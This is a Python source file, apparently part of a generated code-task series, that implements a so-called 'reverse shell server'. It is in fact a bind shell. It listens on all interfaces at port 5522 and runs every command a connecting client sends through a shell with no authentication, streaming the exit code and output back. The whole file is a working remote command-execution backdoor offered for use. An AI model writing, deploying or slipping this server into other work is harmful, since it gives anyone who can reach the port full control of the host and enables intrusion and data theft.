import socket
import threading
import signal
import sys
from typing import Optional


# Imports from TASK_001_shell_result
from data.code_scripts_PAST.stage3_DIMOS_test_v4.TASK_001_shell_result import ConnectionInfo, ShellCommand, ExecutionResult

# Imports from TASK_002_shell_utils
from data.code_scripts_PAST.stage3_DIMOS_test_v4.TASK_002_shell_utils import spawn_shell_process, capture_output_stream


class RemoteConnectionHandler:
    """Handles a single remote connection by spawning shell processes and streaming output."""

    def __init__(self, client_socket: socket.socket):
        self.client_socket = client_socket
        self.running = True
        self.thread: Optional[threading.Thread] = None

    def handle_connection(self) -> None:
        """Main handler loop for a single remote connection.

        Reads commands from the client, executes them via shell process,
        and streams output back to the client.
        """
        try:
            while self.running:
                # Read command from client (newline-delimited)
                data = b""
                while True:
                    chunk = self.client_socket.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if b"\n" in data:
                        break

                if not data.strip():
                    continue

                # Parse command from client
                try:
                    cmd_str = data.decode("utf-8").strip()
                except UnicodeDecodeError:
                    self.client_socket.send(b"ERROR: Invalid UTF-8\n")
                    continue

                if not cmd_str:
                    continue

                # Spawn shell process and capture output
                result = spawn_shell_process(
                    command=cmd_str,
                    timeout_seconds=30.0,
                    host="localhost",
                    port=None,
                    protocol="tcp"
                )

                # Capture the output stream
                execution_result = capture_output_stream(
                    proc=result,
                    timeout_seconds=30.0,
                    blocking=True
                )

                # Send results back to client
                response = (
                    f"EXIT_CODE:{execution_result.return_code}\n"
                    f"DURATION_MS:{execution_result.duration_ms}\n"
                    f"STDOUT:\n{execution_result.stdout.decode('utf-8', errors='replace')}"
                )

                self.client_socket.send(response.encode("utf-8"))

        except socket.timeout:
            pass
        except ConnectionResetError:
            pass
        except BrokenPipeError:
            pass
        except Exception as e:
            try:
                self.client_socket.send(f"ERROR:{str(e)}\n".encode("utf-8"))
            except (BrokenPipeError, ConnectionResetError):
                pass

    def run(self) -> None:
        """Start the handler in a background thread."""
        self.thread = threading.Thread(target=self.handle_connection, daemon=True)
        self.thread.start()


class ReverseShellServer:
    """Main reverse shell server that listens on 0.0.0.0:5522 and handles incoming connections."""

    HOST = "0.0.0.0"
    PORT = 5522
    SERVER_SOCKET: Optional[socket.socket] = None
    HANDLERS: list[RemoteConnectionHandler] = []
    _lock = threading.Lock()

    def __init__(self) -> None:
        self.server_socket: Optional[socket.socket] = None
        self.handlers: list[RemoteConnectionHandler] = []
        self._shutdown_event = threading.Event()

    @classmethod
    def create(cls) -> "ReverseShellServer":
        """Factory method to create a new ReverseShellServer instance."""
        return cls()

    def start(self, backlog: int = 1024) -> None:
        """Start the server listening for incoming connections.

        Args:
            backlog: Maximum number of pending connections in the queue.
        """
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.HOST, self.PORT))
        self.server_socket.listen(backlog)

    def stop(self) -> None:
        """Stop the server and close all sockets."""
        with self._lock:
            if self.server_socket is not None:
                try:
                    self.server_socket.close()
                except (OSError, socket.error):
                    pass
                finally:
                    self.server_socket = None

    def _accept_connection(self) -> None:
        """Accept a single incoming connection and spawn a handler thread."""
        client_socket, addr = self.server_socket.accept()
        with self._lock:
            handler = RemoteConnectionHandler(client_socket)
            self.handlers.append(handler)
        handler.run()

    def _shutdown_all(self) -> None:
        """Shutdown all active connection handlers gracefully."""
        for handler in self.handlers:
            if handler.running and handler.thread is not None:
                handler.running = False
                try:
                    handler.client_socket.close()
                except (OSError, socket.error):
                    pass

    def run(self) -> None:
        """Run the server in a loop accepting connections."""
        self.start()
        print(f"Reverse shell server listening on {self.HOST}:{self.PORT}")

        try:
            while not self._shutdown_event.is_set():
                try:
                    client_socket, addr = self.server_socket.accept()
                    with self._lock:
                        handler = RemoteConnectionHandler(client_socket)
                        self.handlers.append(handler)
                    handler.run()
                except (socket.timeout, BlockingIOError):
                    continue
        finally:
            self.stop()

    def handle_signal(self, signum: int, frame: Optional[object] = None) -> None:
        """Handle shutdown signals to gracefully close all connections."""
        print(f"Received signal {signum}, shutting down...")
        self._shutdown_event.set()
        self._shutdown_all()

    def __enter__(self) -> "ReverseShellServer":
        return self

    def __exit__(self, exc_type: Optional[type], exc_val: Optional[BaseException], exc_tb: Optional[object]) -> None:
        self.stop()


def main() -> None:
    """Main entry point for the reverse shell server."""
    server = ReverseShellServer.create()

    # Set up signal handlers for graceful shutdown
    signal.signal(signal.SIGINT, server.handle_signal)
    signal.signal(signal.SIGTERM, server.handle_signal)

    try:
        server.run()
    except KeyboardInterrupt:
        print("\nShutting down...")
    finally:
        server.stop()


if __name__ == "__main__":
    main()
